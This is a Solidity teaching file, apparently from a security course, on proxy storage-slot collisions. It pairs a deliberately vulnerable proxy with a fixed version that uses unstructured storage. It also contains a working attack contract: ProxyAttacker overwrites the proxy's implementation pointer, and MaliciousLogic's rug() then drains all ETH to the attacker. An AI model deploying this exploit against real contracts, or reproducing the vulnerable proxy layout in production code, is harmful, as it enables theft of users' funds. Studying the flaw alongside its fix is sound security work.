// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract LogicV1 {
    address public miscVar;  // stored in slot 0

    function setMiscVar(address newMiscVar) external {
        miscVar = newMiscVar;
    }
}

contract VulnerableProxy {
    address public implementation;  // stored in slot 0
    address public proxyAdmin;

    constructor(address impl) {
        implementation = impl;
        proxyAdmin = msg.sender;
    }

    receive() external payable {}

    fallback() external payable {
        // fallback function will be called if the signature of the function used does not exists in the Proxy contract. 
        // It will then call this signature in the logic contract.
        _delegate(_getImplementation());
    }

    function _getImplementation() internal view virtual returns (address) {
        return implementation;
    }

    function _setImplementation(address impl) internal virtual {
        implementation = impl;
    }

    function _delegate(address impl) internal {
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }
}

contract FixedProxy is VulnerableProxy {
    // Unstructured storage slot avoids clashing with logic's slot 0 / slot 1.
    // Any proxy state variable that must stay tamper-proof needs either unstructured storage or immutable
    bytes32 private constant IMPLEMENTATION_SLOT = bytes32(uint256(keccak256("securityintro.fixedproxy.implementation")) - 1);
    address public immutable PROXY_ADMIN;

    constructor(address impl) VulnerableProxy(impl) {
        PROXY_ADMIN = msg.sender;
        _setImplementation(impl);
    }

    function upgradeTo(address newImpl) external {
        require(msg.sender == PROXY_ADMIN, "not admin");
        _setImplementation(newImpl);
    }

    function _getImplementation() internal view override returns (address impl) {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            impl := sload(slot)
        }
    }

    function _setImplementation(address impl) internal override {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, impl)
        }
    }
}

contract MaliciousLogic {
    function rug(address payable thief) external {
        (bool ok,) = thief.call{value: address(this).balance}("");
        require(ok, "rug failed");
    }
}

// Step 1: call setMiscVar(address(malicious)) through the proxy so that slot 0
//         of the proxy (implementation) is overwritten with malicious's address.
// Step 2: now that the proxy forwards calls to MaliciousLogic, call rug() to
//         drain all ETH to this contract's owner.
contract ProxyAttacker {
    MaliciousLogic private immutable malicious;
    address payable private immutable owner;

    constructor() {
        malicious = new MaliciousLogic();
        owner = payable(msg.sender);
    }

    function attack(address proxy) external {
        // Overwrite slot 0 of the proxy (its `implementation` pointer) with the
        // address of MaliciousLogic. This works because LogicV1.setMiscVar writes
        // to slot 0, which collides with VulnerableProxy.implementation.
        (bool ok1,) = proxy.call(abi.encodeWithSignature("setMiscVar(address)", address(malicious)));
        require(ok1, "setMiscVar failed");

        // The proxy now delegates to MaliciousLogic, so rug() drains its ETH.
        (bool ok2,) = proxy.call(abi.encodeWithSignature("rug(address)", owner));
        require(ok2, "rug failed");
    }
}
